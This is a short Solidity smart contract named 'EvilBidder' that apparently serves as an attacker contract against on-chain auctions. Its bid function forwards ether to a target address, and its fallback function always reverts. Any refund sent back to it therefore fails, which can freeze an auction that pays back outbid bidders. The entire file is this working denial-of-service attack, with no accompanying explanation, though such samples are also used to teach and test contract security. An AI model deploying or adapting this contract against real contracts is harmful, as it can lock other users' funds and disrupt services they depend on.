pragma solidity ^0.4.18;

contract EvilBidder {
    // the fallback function
    function() public payable {
        revert();
    }

    //the function for bidding
    function bid(address _to) public payable {
        // do bidding
        _to.transfer(msg.value);
    }
}